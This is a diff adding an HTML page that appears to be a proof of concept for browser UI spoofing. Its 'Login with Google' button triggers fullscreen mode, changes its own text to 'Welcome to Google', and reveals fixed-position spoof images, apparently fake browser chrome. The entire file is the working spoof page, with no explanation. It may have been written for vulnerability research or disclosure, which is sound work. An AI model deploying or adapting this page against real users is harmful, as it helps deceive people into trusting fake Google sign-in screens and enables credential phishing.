@@ -1,0 +1,58 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <script>
+        function poc() {
+document.body.requestFullscreen();
+img.style.display='inline';
+        };
+
+    </script>
+   <style>
+       body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: black ; /* Ensures the background stays white */
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+}
+
+.container {
+    display: none; /* Initially hidden */
+    text-align: center;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+}
+
+button {
+    background-color: #4285f4;
+    color: white;
+    border: none;
+    padding: 12px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+    </style>
+</head>
+<body>
+
+    <div id="landing" >
+        <h1>
+        <button onclick="poc();this.innerHTML='<marquee>Welcome to Google';this.style.backgroundColor='red'">Login with Google</button></h1>
+    </div>
+<img onclick="img2.style.display='inline'" id=img src="spoof.jpg" style="display:none;position: fixed; bottom: 20px; left: 0; width: 100%; max-height: 100px; z-index: 1000;">
+<img onclick="img2.style.display='none'" id=img2 src="spoof2.jpg" style="display:none; position: fixed; bottom: -100px; left: 0; width: 100%;  z-index: 1001;">
+
+</body>
+</html>
